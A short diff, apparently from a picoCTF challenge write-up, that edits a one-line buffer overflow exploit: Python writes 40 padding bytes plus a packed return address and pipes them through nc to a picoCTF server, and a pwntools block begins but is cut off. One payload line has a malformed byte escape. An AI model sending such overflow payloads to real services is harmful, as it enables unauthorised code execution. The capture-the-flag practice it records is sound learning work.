@@ -1,5 +1,5 @@
 (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"\xb6\x84\x1\x40")') | nc mysterious-sea.picoctf.net 57579
-(python3 -c 'import sys; from struct import pack; sys.stdout.buffer.write(b"A"*40 + pack("<Q", 0x401256))') | nc mysterious-sea.picoctf.net 57579
+(python3 -c 'import sys; from struct import pack; sys.stdout.buffer.write(b"A"*40 + pack("<Q", 0x401256))') | nc mysterious-sea.picoctf.net 49248
 
 ```python
 from pwn import *
